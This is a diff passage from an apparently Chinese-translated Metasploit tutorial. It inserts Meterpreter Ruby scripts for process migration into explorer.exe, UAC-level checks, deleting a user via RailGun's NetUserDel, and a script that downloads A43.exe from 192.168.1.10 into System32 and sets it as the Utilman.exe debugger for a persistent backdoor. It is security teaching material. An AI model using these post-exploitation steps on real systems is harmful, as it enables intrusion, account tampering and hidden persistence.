+current_pid = session.sys.process.getpid 
+print_status("Current PID is #{current_pid}") 
+end 
+end  
+```
 
 这里的代码段非常有趣。我们首先使用`session.sys.process.getpid`找到当前进程 ID，然后使用`session.sys.process.get_processes()`上的循环遍历目标系统上的所有进程。如果找到任何名称为`explorer.exe`的进程，我们打印出一条消息并将其 ID 存储到`explorer_ppid`变量中。使用`session.core.migrate()`方法，我们将存储的进程 ID（`explorer.exe`）传递到`explorer.exe`进程中进行迁移。最后，我们只是再次打印当前进程 ID，以确保我们是否成功迁移：
 
-[PRE48]
+```
+# Finding the Current User 
+print_status("Getting the Current User ID") 
+currentuid = session.sys.config.getuid 
+print_good("Current Process ID is #{currentuid}") 
+```
 
 在先前的代码中，我们只是使用`sessions.sys.config.getuid`方法找到当前用户的标识符：
 
-[PRE49]
+```
+#Checking if UAC is Enabled 
+uac_check = is_uac_enabled? 
+if(uac_check) 
+print_error("UAC is Enabled") 
+uac_level = get_uac_level 
+if(uac_level = 5) 
+print_status("UAC level is #{uac_level.to_s} which is Default") 
+elsif (uac_level = 2) 
+print_status("UAC level is #{uac_level.to_s} which is Always Notify") 
+else 
+print_error("Some Error Occured") 
+end 
+else 
+print_good("UAC is Disabled") 
+end 
+```
 
 前面的代码检查了目标系统上是否启用了 UAC。如果启用了 UAC，我们进一步深入，使用`get_uac_level`方法找到 UAC 的级别，并通过其响应值打印状态。
 
@@ -813,7 +1361,9 @@ RailGun 给了我们巨大的力量，可以执行 Metasploit 有时无法执行
 
 现在，让我们看看如何使用 RailGun 进行基本 API 调用，并了解其工作原理：
 
-[PRE50]
+```
+client.railgun.DLLname.function(parameters) 
+```
 
 这是 RailGun 中 API 调用的基本结构。`client.railgun`关键字定义了客户端对 RailGun 功能的需求。`DLLname`关键字指定了我们将要调用的 DLL 文件的名称。语法中的`function (parameters)`关键字指定了要使用来自 DLL 文件的所需参数来激发的实际 API 函数。
 
@@ -829,7 +1379,9 @@ RailGun 给了我们巨大的力量，可以执行 Metasploit 有时无法执行
 
 接下来，让我们看一个带参数的 API 调用：
 
-[PRE51]
+```
+client.railgun.netapi32.NetUserDel(arg1,agr2) 
+```
 
 当上述命令运行时，它会从客户端的机器中删除特定用户。目前，我们有以下用户：
 
@@ -855,7 +1407,19 @@ DLL 文件负责在基于 Windows 的系统上执行大部分任务。因此，�
 
 更进一步，让我们深入研究使用 RailGun 编写 Meterpreter 扩展的脚本。首先，让我们创建一个脚本，该脚本将向 Metasploit 上下文中添加一个自定义命名的 DLL 文件：
 
-[PRE52]
+```
+if client.railgun.get_dll('urlmon') == nil 
+print_status("Adding Function") 
+end 
+client.railgun.add_dll('urlmon','C:\WINDOWS\system32\urlmon.dll') 
+client.railgun.add_function('urlmon','URLDownloadToFileA','DWORD',[ 
+["DWORD","pcaller","in"], 
+["PCHAR","szURL","in"], 
+["PCHAR","szFileName","in"], 
+["DWORD","Reserved","in"], 
+["DWORD","lpfnCB","in"], 
+]) 
+```
 
 将代码保存在名为`urlmon.rb`的文件中，放在`/scripts/meterpreter`目录下。
 
@@ -865,7 +1429,12 @@ DLL 文件负责在基于 Windows 的系统上执行大部分任务。因此，�
 
 我们在同一目录下创建另一个脚本，并将其命名为`railgun_demo.rb`，如下所示：
 
-[PRE53]
+```
+client.railgun.urlmon.URLDownloadToFileA(0,"http://192.168.1.10 /A43.exe","C:\Windows\System32\a43.exe",0,0) 
+key="HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" 
+syskey=registry_createkey(key) 
+registry_setvaldata(key,'Debugger','a43.exe','REG_SZ') 
+```
 
 如前所述，脚本的第一行将调用自定义添加的 DLL 函数`URLDownloadToFile`，并提供所需的参数。
 
